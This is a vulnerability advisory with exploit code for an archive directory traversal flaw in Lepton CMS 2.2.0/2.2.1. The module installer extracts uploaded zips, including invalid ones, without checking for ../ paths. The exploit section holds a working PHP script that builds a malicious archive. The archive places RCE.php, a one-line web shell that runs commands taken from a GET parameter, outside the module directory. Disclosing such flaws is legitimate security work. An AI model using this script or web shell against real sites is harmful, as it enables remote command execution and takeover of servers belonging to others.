Vendor:
==================
www.lepton-cms.org


Product:
=================================
Lepton CMS 2.2.0 / 2.2.1 (update)

LEPTON is an easy-to-use but full customizable Content Management System (CMS).


Vulnerability Type:
============================
Archive Directory Traversal


CVE Reference:
==============
N/A


Vulnerability Details:
=====================

Lepton has feature that lets users install new modules, if malicious user uploads an archive and the module is not valid it
will generate an error. However, the malicious archive will still get decompressed and no check is made for ../ characters in
the file name allowing in arbitrary PHP files to be placed outside the intended target directory for installed modules. This can
then be used to execute remote commands on the affected host system.

e.g.

We get error message as below.

under "Add Ons" tab Install Module.
Invalid LEPTON installation file. Please check the *.zip format.[1]

Archive still gets decompressed and the malicious file is moved outside of the intended target directory, by using ../ in file name.


Exploit code(s):
===============

<?php
#Archive Directory Traversal to RCE exploit
#==============================================

if($argc<2){echo "Usage: <filename>";exit();}
$file_name=$argv[1];

$zip = new ZipArchive();
$res = $zip->open("$file_name.zip", ZipArchive::CREATE);
$zip->addFromString("..\..\..\..\..\..\..\..\RCE.php", '<?php exec($_GET["cmd"]); ?>');
$zip->close();

echo "Malicious archive created...\r\n";
echo "========= hyp3rlinx ============";
?>
